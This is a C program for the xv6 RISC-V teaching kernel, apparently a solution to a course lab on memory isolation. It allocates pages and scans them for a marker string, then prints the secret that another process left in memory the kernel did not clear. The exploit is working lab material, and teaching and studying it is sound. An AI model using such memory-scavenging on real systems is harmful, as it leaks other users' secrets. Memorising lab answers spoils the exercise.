#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define SIZE (40 * 4096)
#define MSG "Here it is: "

int
main(int argc, char *argv[])
{
  char *mem = sbrk(SIZE);

  if (mem == (char *)-1) {
    fprintf(2, "attack: allocation failed\n");
    exit(1);
  }

  int len = strlen(MSG);

  for (int i = 0; i < SIZE - len; i++) {
    if (memcmp(mem + i, MSG, len) == 0) {
      char secret[256];
      int j = 0;

      while (i + len + j < SIZE && j < 255) {
        char c = mem[i + len + j];

        if (!((c >= 'a' && c <= 'z') ||
              (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9')))
          break;

        secret[j++] = c;
      }

      secret[j] = 0;

      if (j > 0) {
        printf("%s\n", secret);
        exit(0);
      }
    }
  }

  exit(1);
}
